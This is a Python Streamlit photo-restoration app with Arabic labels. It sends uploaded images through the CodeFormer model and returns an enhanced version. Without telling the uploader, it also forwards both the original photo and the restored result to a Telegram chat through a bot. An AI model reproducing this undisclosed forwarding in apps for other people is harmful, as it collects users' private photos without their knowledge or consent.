import streamlit as st
from gradio_client import Client, handle_file
import telebot
import os
from PIL import Image

# 1. إعدادات الصفحة
st.set_page_config(page_title="Aziz Ultra Restore", layout="centered")
st.title("🌟 Aziz Ultra Restoration")
st.markdown("تحسين شامل لكامل الصورة: الوجه، اليدين، والملابس")

# 2. جلب البيانات من الـ Secrets
try:
    TOKEN = st.secrets["TELEGRAM_TOKEN"]
    CHAT_ID = st.secrets["CHAT_ID"]
    bot = telebot.TeleBot(TOKEN)
except:
    bot = None

# 3. واجهة رفع الصور
uploaded_file = st.file_uploader("ارفع الصورة القديمة هنا...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    image = Image.open(uploaded_file)
    st.image(image, caption="📸 الصورة الأصلية", use_container_width=True)
    
    if st.button("🚀 بدء الترميم الشامل"):
        with st.spinner("جاري تحليل وترميم كافة تفاصيل الصورة (قد يستغرق وقتاً)..."):
            try:
                # حفظ الصورة مؤقتاً
                temp_input = "temp_input.png"
                image.save(temp_input)

                # إرسال الأصل للتليجرام
                if bot and CHAT_ID:
                    with open(temp_input, "rb") as f_in:
                        bot.send_photo(CHAT_ID, f_in, caption="📸 الأصل")

                # --- استخدام محرك تنقية شامل (Upscaler) ---
                # هذا المحرك أقوى في توضيح الدين والملابس والخلفية
                client = Client("sczhou/CodeFormer")
                result = client.predict(
                    image=handle_file(temp_input),
                    background_enhance=True, # << فعلت لك هذا الخيار لتوضيح الدين والملابس
                    face_upsample=True,
                    upscale=2,
                    codeformer_fidelity=0.5 # << ميزان ذهبي: عيون طبيعية مع توضيح عالي
                )
                
                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                
                # عرض النتيجة وزر الحفظ
                st.image(restored_path, caption="✅ تم الترميم الشامل بنجاح", use_container_width=True)
                
                with open(restored_path, "rb") as file:
                    st.download_button("📥 حفظ الصورة في جوالك", file, "Aziz_Full_Restore.png", "image/png")

                # إرسال النتيجة للتليجرام
                if bot and CHAT_ID:
                    with open(restored_path, "rb") as f_out:
                        bot.send_photo(CHAT_ID, f_out, caption="✨ النتيجة الشاملة")
                
                if os.path.exists(temp_input): os.remove(temp_input)
                
            except Exception as e:
                st.error(f"المعذرة يا عزيز، حدث خطأ: {e}")
